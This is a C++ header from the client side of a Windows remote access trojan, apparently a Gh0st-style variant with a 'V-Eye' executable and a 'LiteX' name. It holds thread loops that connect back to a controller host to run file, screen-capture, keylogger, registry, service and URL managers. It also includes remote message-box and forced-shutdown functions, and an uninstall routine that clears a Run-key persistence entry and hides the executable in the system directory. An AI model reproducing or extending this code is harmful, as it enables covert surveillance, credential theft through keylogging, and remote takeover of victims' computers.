#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "until.h"
#include <STDLIB.H>
#include "Plugins\ScreenManager.h"
#include "Plugins\FileManager.h"
#include "Plugins\SystemManager.h"
#include "Plugins\KeyboardManager.h"
#include "Plugins\ServiceManager.h"
#include "Plugins\RegManager.h"
#include "Plugins\UrlManager.h"
//#include "Plugins\ShellManager.h"

#include "InstallService.h"
extern BOOL     bisUnInstall;
extern BOOL g_bExit;

DWORD WINAPI Loop_FileManager(LPVOID sRemote)
{
    CClientSocket	socketClient(g_bExit);
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CFileManager	manager(&socketClient);
    socketClient.run_event_loop();

    return 0;
}

// DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
// {
// 	CClientSocket	socketClient;
// 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
// 		return -1;
// 	CShellManager	manager(&socketClient);
// 	socketClient.run_event_loop();
// 	return 0;
// }

DWORD WINAPI Loop_ScreenManager(LPVOID sRemote)
{
    CClientSocket	socketClient(g_bExit);
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CScreenManager	manager(&socketClient);

    socketClient.run_event_loop();
    return 0;
}

DWORD WINAPI Loop_SystemManager(LPVOID sRemote)
{
    CClientSocket	socketClient(g_bExit);
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CSystemManager	manager(&socketClient);
    socketClient.run_event_loop();

    return 0;
}


DWORD WINAPI Loop_KeyboardManager(LPVOID sRemote)
{
    CClientSocket	socketClient(g_bExit);
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;
    CKeyboardManager1	manager(&socketClient);
    socketClient.run_event_loop();
    return 0;
}


DWORD WINAPI Loop_ServiceManager(LPVOID sRemote)
{
    CClientSocket	socketClient(g_bExit);
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CServiceManager	manager(&socketClient);

    socketClient.run_event_loop();

    return 0;
}

DWORD WINAPI Loop_RegeditManager(LPVOID sRemote)          //ע������
{
    CClientSocket	socketClient(g_bExit);
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CRegManager	manager(&socketClient);
    socketClient.run_event_loop();
    return 0;
}

DWORD WINAPI Loop_UrlManager(LPVOID sRemote)          //ע������
{
    CClientSocket	socketClient(g_bExit);
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CUrlManager	manager(&socketClient);
    socketClient.run_event_loop();
    return 0;
}


void UninstallService()
{
    HKEY hKey;
    LONG lRet;

    lRet = RegOpenKeyEx( HKEY_LOCAL_MACHINE,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0, KEY_QUERY_VALUE|KEY_WRITE, &hKey );
    if( lRet == ERROR_SUCCESS ) {
        RegDeleteValue(hKey, _T("LiteX"));
        RegCloseKey(hKey);
    }

    OSVERSIONINFO OSversion;
    OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&OSversion);

    if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT) {
        if (OSversion.dwMajorVersion >= 6) {
            bisUnInstall = TRUE;
        }
    }

    DeleteFile(_T("C:\\V-Eye\\V-Eye.ini"));

    char	strRandomFile[MAX_PATH];
    GetSystemDirectory(strRandomFile, sizeof(strRandomFile));
    wsprintfA(strRandomFile, "%s\\%d.bak",strRandomFile, GetTickCount());

    MoveFile(_T("C:\\V-Eye\\V-Eye.exe"), strRandomFile);

    ExitProcess(0);
}
// ����
DWORD WINAPI Loop_Messagebox(LPVOID lParam)
{
    struct MSGBOX {
        CHAR Title[200];
        CHAR szText[1000];
        UINT Type;
    } MsgBox;

    memcpy(&MsgBox,lParam,sizeof(MSGBOX));
    MessageBox(NULL,MsgBox.szText,MsgBox.Title,MsgBox.Type|MB_SYSTEMMODAL);

    return -1;
}

// �ػ�
void ShutdownWindows( DWORD dwReason )
{
    DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
    ExitWindowsEx(dwReason, 0);
    DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);
}

//�޸ı�ע ����� bUpGroup == FALSE Ϊ�޸ı�ע TRUE Ϊ�޸ķ���
void SetHostID(LPCTSTR lpBuffer,BOOL bUpGroup = FALSE)
{
    char strSubKey[MAX_PATH];
    wsprintf(strSubKey, _T("SYSTEM\\CurrentControlSet\\Services\\%s"), _T("BITS"));

    char *str = _T("Remark");
    if (bUpGroup)
        str = "Group";
    WriteRegEx(HKEY_LOCAL_MACHINE,
               strSubKey,
               str,
               REG_SZ,
               (char*)lpBuffer,
               strlen(lpBuffer),
               1);
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
